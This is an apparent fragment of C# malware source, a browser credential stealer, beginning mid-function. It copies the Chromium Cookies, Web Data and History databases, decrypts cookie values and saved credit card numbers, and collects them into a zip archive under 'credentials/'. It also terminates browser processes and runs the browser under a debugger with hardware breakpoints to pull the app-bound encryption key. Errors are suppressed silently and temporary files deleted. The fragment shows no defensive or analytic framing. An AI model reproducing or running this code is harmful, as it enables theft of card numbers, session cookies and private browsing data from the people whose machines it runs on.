                if (sqlite3_prepare_v2(db, Encoding.UTF8.GetBytes("SELECT host_key, name, value, encrypted_value FROM cookies\0"), -1, out IntPtr stmt, IntPtr.Zero) == 0) {
                    var sb = new StringBuilder(); while (sqlite3_step(stmt) == 100) { byte[] b = new byte[sqlite3_column_bytes(stmt, 3)]; Marshal.Copy(sqlite3_column_blob(stmt, 3), b, 0, b.Length); byte[] dec = DecryptBlob(b, v10Key, v20Key, config.Name.Contains("Opera")); string val = dec != null ? Encoding.UTF8.GetString(dec) : ReadUtf8(sqlite3_column_text(stmt, 2)); if (!string.IsNullOrEmpty(val)) sb.AppendLine($"Host: {ReadUtf8(sqlite3_column_text(stmt, 0))} | Name: {ReadUtf8(sqlite3_column_text(stmt, 1))} | Value: {val}"); }
                    sqlite3_finalize(stmt); if (sb.Length > 0) using (var writer = new StreamWriter(archive.CreateEntry($"credentials/{config.OutputDir}/cookies.txt").Open())) writer.Write(sb.ToString());
                } sqlite3_close(db);
            } } catch { } finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
        }

        private static void ExtractAutofill(string profilePath, byte[] v10Key, byte[] v20Key, BrowserConfig config, ZipArchive archive)
        {
            string dbPath = Path.Combine(profilePath, "Web Data"); if (!File.Exists(dbPath)) return;
            string tempDb = Path.Combine(Path.GetTempPath(), config.TempPrefix + "_autofill");
            try { File.Copy(dbPath, tempDb, true); if (sqlite3_open(Encoding.UTF8.GetBytes(tempDb + "\0"), out IntPtr db) == 0) {
                var sb = new StringBuilder(); if (sqlite3_prepare_v2(db, Encoding.UTF8.GetBytes("SELECT name, value FROM autofill\0"), -1, out IntPtr stmt, IntPtr.Zero) == 0) { while (sqlite3_step(stmt) == 100) sb.AppendLine($"Form: {ReadUtf8(sqlite3_column_text(stmt, 0))} = {ReadUtf8(sqlite3_column_text(stmt, 1))}"); sqlite3_finalize(stmt); }
                if (sqlite3_prepare_v2(db, Encoding.UTF8.GetBytes("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards\0"), -1, out stmt, IntPtr.Zero) == 0) {
                    while (sqlite3_step(stmt) == 100) { byte[] b = new byte[sqlite3_column_bytes(stmt, 3)]; Marshal.Copy(sqlite3_column_blob(stmt, 3), b, 0, b.Length); byte[] dec = DecryptBlob(b, v10Key, v20Key, config.Name.Contains("Opera")); if (dec != null) sb.AppendLine($"Card: {ReadUtf8(sqlite3_column_text(stmt, 0))} | Exp: {sqlite3_column_int(stmt, 1)}/{sqlite3_column_int(stmt, 2)} | Num: {Encoding.UTF8.GetString(dec)}"); }
                    sqlite3_finalize(stmt);
                } if (sb.Length > 0) using (var writer = new StreamWriter(archive.CreateEntry($"credentials/{config.OutputDir}/autofill.txt").Open())) writer.Write(sb.ToString());
                sqlite3_close(db);
            } } catch { } finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
        }

        private static void ExtractHistory(string profilePath, BrowserConfig config, ZipArchive archive)
        {
            string dbPath = Path.Combine(profilePath, "History"); if (!File.Exists(dbPath)) return;
            string tempDb = Path.Combine(Path.GetTempPath(), config.TempPrefix + "_history");
            try { File.Copy(dbPath, tempDb, true); if (sqlite3_open(Encoding.UTF8.GetBytes(tempDb + "\0"), out IntPtr db) == 0) {
                if (sqlite3_prepare_v2(db, Encoding.UTF8.GetBytes("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100\0"), -1, out IntPtr stmt, IntPtr.Zero) == 0) {
                    var sb = new StringBuilder(); while (sqlite3_step(stmt) == 100) sb.AppendLine($"URL: {ReadUtf8(sqlite3_column_text(stmt, 0))} | Title: {ReadUtf8(sqlite3_column_text(stmt, 1))} | Visits: {sqlite3_column_int(stmt, 2)}");
                    sqlite3_finalize(stmt); if (sb.Length > 0) using (var writer = new StreamWriter(archive.CreateEntry($"credentials/{config.OutputDir}/history.txt").Open())) writer.Write(sb.ToString());
                } sqlite3_close(db);
            } } catch { } finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
        }

        #endregion

        #region Core Execution

        public static void Execute(string zipPath)
        {
            using (var archive = ZipFile.Open(zipPath, File.Exists(zipPath) ? ZipArchiveMode.Update : ZipArchiveMode.Create))
            {
                foreach (var config in Configs) {
                    string baseDir = config.UseRoaming ? Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) : Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    string userDataDir = Path.Combine(baseDir, Path.Combine(config.UserDataSubdir)); if (!Directory.Exists(userDataDir)) continue;
                    string exePath = config.ExePaths.FirstOrDefault(File.Exists); if (string.IsNullOrEmpty(exePath)) continue;
                    KillProcesses(config.ProcessName);
                    byte[] v10Key = GetV10Key(userDataDir), v20Key = config.HasAbe ? DebugAndExtractV20Key(exePath, config) : null;
                    var profilePaths = new List<string>(); if (config.Name.Contains("Opera")) profilePaths.Add(userDataDir); else { profilePaths.Add(Path.Combine(userDataDir, "Default")); foreach (var dir in Directory.GetDirectories(userDataDir, "Profile *")) profilePaths.Add(dir); }
                    foreach (var profilePath in profilePaths) { if (!Directory.Exists(profilePath)) continue; ExtractPasswords(profilePath, v10Key, v20Key, config, archive); ExtractCookies(profilePath, v10Key, v20Key, config, archive); ExtractAutofill(profilePath, v10Key, v20Key, config, archive); ExtractHistory(profilePath, config, archive); }
                }
            }
        }

        private static byte[] DebugAndExtractV20Key(string exePath, BrowserConfig config)
        {
            var si = new STARTUPINFO { cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO)) }; var pi = new PROCESS_INFORMATION();
            if (!CreateProcess(null, new StringBuilder($"\"{exePath}\" --no-sandbox --disable-gpu --no-first-run"), IntPtr.Zero, IntPtr.Zero, false, 1 | 0x10, IntPtr.Zero, null, ref si, out pi)) return null;
            byte[] key = null; IntPtr targetAddr = IntPtr.Zero;
            while (WaitForDebugEvent(out var evt, 10000)) {
                if (evt.dwDebugEventCode == 5) break;
                if (evt.dwDebugEventCode == 6) { var sb = new StringBuilder(260); if (GetFinalPathNameByHandle(evt.LoadDll.hFile, sb, (uint)sb.Capacity, 0) > 0 && sb.ToString().ToLower().Contains(config.DllName.ToLower())) { targetAddr = FindTargetAddress(pi.hProcess, evt.LoadDll.lpBaseOfDll, config.Name); if (targetAddr != IntPtr.Zero) foreach (var tid in GetProcessThreads(pi.dwProcessId)) SetHardwareBreakpoint(tid, targetAddr); } }
                else if (evt.dwDebugEventCode == 2) { if (targetAddr != IntPtr.Zero) SetHardwareBreakpoint(evt.dwThreadId, targetAddr); }
                else if (evt.dwDebugEventCode == 1 && evt.Exception.ExceptionRecord.ExceptionCode == 0x80000004 && (IntPtr)evt.Exception.ExceptionRecord.ExceptionAddress == targetAddr) { key = ExtractKey(evt.dwThreadId, pi.hProcess, config); if (key != null) { ClearHardwareBreakpoints(pi.dwProcessId); TerminateProcess(pi.hProcess, 0); } SetResumeFlag(evt.dwThreadId); }
                ContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, 0x00010002); if (key != null) break;
            } CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return key;
        }

        #endregion

        #region Constants
        public const uint THREAD_GET_CONTEXT = 0x0008, THREAD_SET_CONTEXT = 0x0010, THREAD_SUSPEND_RESUME = 0x0002, TH32CS_SNAPTHREAD = 4, CONTEXT_AMD64 = 0x00100000, CONTEXT_CONTROL = CONTEXT_AMD64 | 1, CONTEXT_INTEGER = CONTEXT_AMD64 | 2, CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x10, CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER;
        #endregion
    }
}
